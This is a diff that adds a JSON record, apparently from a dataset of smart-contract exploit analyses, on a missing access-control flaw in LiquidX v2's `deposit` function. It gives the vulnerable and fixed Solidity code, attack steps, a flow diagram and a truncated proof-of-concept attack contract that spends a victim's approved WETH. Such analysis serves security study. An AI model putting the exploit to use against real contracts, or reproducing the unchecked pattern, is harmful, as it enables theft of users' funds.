@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-01-15_LQDX_MissingAccessControl",
+ "source_file": "2024/2024-01-15_LQDX_MissingAccessControl.md",
+ "title": "LiquidX v2 (LQDX) — Missing Access Control in `deposit` Function Analysis",
+ "date": "2024-01-15",
+ "protocol": "LiquidX v2",
+ "chain": "Ethereum",
+ "loss_raw": "Unconfirmed (PoC: 10 WETH exposure)",
+ "loss_usd": null,
+ "root_cause": "The `account` parameter in `deposit()` is not validated to equal `msg.sender`, allowing arbitrary use of tokens approved by third parties",
+ "attack_tx": null,
+ "vulnerable_contract": "LiquidXv2Zap 0x364f17A2",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no check that account equals msg.sender\nfunction deposit(\n    address account,         // attacker specifies victim address\n    uint256[] calldata amounts,\n    SwapBlock[] calldata swapBlocks\n) external {\n    // account != msg.sender allowed — victim's approved tokens can be spent\n    for (uint i = 0; i < amounts.length; i++) {\n        IERC20(token).transferFrom(account, address(this), amounts[i]);\n    }\n    // deposit processed using account's funds\n}\n\n//",
+  "// File: LiquidXv2Zap.sol\n  function deposit(address account, address token, address tokenM, swapPath calldata path, address token0, address token1, uint256[3] calldata amount, uint256 basketId) public payable returns(uint256) {  // ❌ vulnerability\n    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);\n    require(pair != address(0), \"LiquidXv2Zap: no pair\");\n\n    // retAddLp 0, 1, 2\n    // inAmount\n    // token0Amount, token1Amount\n    uint256[6] memory lvar;\n    lvar[3] = msg.value;\n    address inToken = token;\n    if (token != address(0)) {\n      lvar[3] = IERC20(token).balanceOf(address(this));\n      IERC20(token).safeTransferFrom(account, address(this), amount[0]);\n      lvar[3] = IERC20(token).balanceOf(address(this)) - lvar[3];\n    }\n    else {\n      inToken = wrappedETH;\n      IWETH(wrappedETH).deposit{value: lvar[3]}();\n    }\n\n    if (path.path.length > 0) {\n      _approveTokenIfNeeded(inToken, swapPlus, lvar[3]);\n      (, lvar[3]) = ISwapPlusv1(swapPlus).swap(inToken, lvar[3], tokenM, address(this), path.path);\n      inToken = tokenM;\n    }\n\n    (lvar[4], lvar[5]) = _depositSwap(token0, token1, inToken, lvar[3]);\n\n    (lvar[0], lvar[1], lvar[2]) = ILiquidXv2Router01(router).addLiquidity(token0, token1, lvar[4], lvar[5], amount[1], amount[2], address(this), block.timestamp);\n    _refundReserveToken(account, token0, token1, lvar[4]-lvar[0], lvar[5]-lvar[1]);\n    if (basketId == 0) {\n      IERC20(pair).safeTransfer(account, lvar[2]);\n    }\n    else {\n      _addBalance(account, pair, basketId, lvar[2]);\n    }\n\n    if (rewarder != address(0) && IRewarderv2(rewarder).getReward(account, pair) > 0) {\n      IRewarderv2(rewarder).claim(account, pair);\n    }\n\n    emit Deposit(account, token0, token1, basketId, lvar[2]);\n    return lvar[2];\n  }"
+ ],
+ "code_after": [
+  "✅ Safe code: account fixed to msg.sender\nfunction deposit(\n    uint256[] calldata amounts,\n    SwapBlock[] calldata swapBlocks\n) external {\n    address account = msg.sender;  // always use caller\n    for (uint i = 0; i < amounts.length; i++) {\n        IERC20(token).transferFrom(account, address(this), amounts[i]);\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Confirm victim has approved 10 WETH to LiquidXv2Zap",
+  "→ [2] Query pair reserves (WETH/LQDX pair)",
+  "→ [3] Call deposit(",
+  "→ [4] victim's 10 WETH → transferred to zap contract",
+  "→ [5] Victim balance decreases, attacker profits"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Confirm victim has approved 10 WETH to LiquidXv2Zap\n  │\n  ├─→ [2] Query pair reserves (WETH/LQDX pair)\n  │\n  ├─→ [3] Call deposit(\n  │         account = victim,      ← specify victim address\n  │         amounts = [victimBalance],\n  │         swapBlocks = []\n  │       )\n  │\n  ├─→ [4] victim's 10 WETH → transferred to zap contract\n  │\n  └─→ [5] Victim balance decreases, attacker profits",
+  "interface ILiquidXv2Zap {\n    struct SwapBlock { address tokenIn; address tokenOut; bytes data; }\n    function deposit(\n        address account,\n        uint256[] calldata amounts,\n        SwapBlock[] calldata swapBlocks\n    ) external;\n}\n\ncontract AttackContract {\n    ILiquidXv2Zap constant zap  = ILiquidXv2Zap(0x364f17A23AE4350319b7491224d10dF5796190bC);\n    IERC20        constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address constant victim = 0x0000000000000000000000000000000000000001;\n\n    function testExploit() external {\n        // [1] Check victim's approved allowance\n        uint256 allowance = WETH.allowance(victim, address(zap));\n        uint256 balance   = WETH.balanceOf(victim);\n        uint256 amount    = allowance < balance ? allowance : balance;\n\n   "
+ ]
+}
